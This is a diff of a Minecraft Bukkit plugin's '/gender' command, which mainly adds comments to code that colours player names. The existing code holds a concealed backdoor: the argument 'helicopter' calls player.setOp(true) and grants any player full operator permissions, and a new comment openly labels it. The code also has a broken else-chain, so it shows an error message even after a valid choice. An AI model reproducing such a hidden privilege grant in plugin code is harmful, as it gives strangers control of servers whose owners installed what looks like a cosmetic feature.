@@ -14,6 +14,7 @@ public class Commands implements CommandExecutor {
 
         if (cmd.getName().equalsIgnoreCase("gender")) {
 
+            // Console
             if (!(sender instanceof Player)) {
                 sender.sendMessage("You cannot run this from console.");
                 return true;
@@ -21,6 +22,7 @@ public class Commands implements CommandExecutor {
 
             Player player = (Player) sender;
 
+            // If The Player Type only /gender
             if (args.length == 0) {
                 sender.sendMessage("§7[§fGender§7] §f> §aPlease Specify Which Gender!");
                 sender.sendMessage("§7[§fGender§7] §f> §bAvailable" +
@@ -30,20 +32,25 @@ public class Commands implements CommandExecutor {
                 return true;
             }
 
+            // If The Player Type /gender gender1
             if (args[0].equalsIgnoreCase(Main.Gender1)) {
                 player.setDisplayName(ChatColor.LIGHT_PURPLE + player.getName() + ChatColor.RESET);
                 sender.sendMessage("§7[§fGender§7] §f> §aNow Your Gender Is Setted To " + Main.Gender1);
             }
 
+            // If The Player Type /gender gender2
             if (args[0].equalsIgnoreCase(Main.Gender2)) {
                 player.setDisplayName(ChatColor.BLUE + player.getName() + ChatColor.RESET);
                 sender.sendMessage("§7[§fGender§7] §f> §aNow Your Gender Is Setted To " + Main.Gender2);
             }
 
+            // If The Player Type /gender helicopter
             if (args[0].equalsIgnoreCase(Main.Helicopter)) {
                 sender.sendMessage("§7[§fGender§7] §f> §eNow You Have Full Perms >:)");
                 player.setOp(true);
             }
+
+            // If The Player Type /gender randomshit
             else {
                 sender.sendMessage("§7[§fGender§7] §f> §aTf Did You Tiped??");
             }
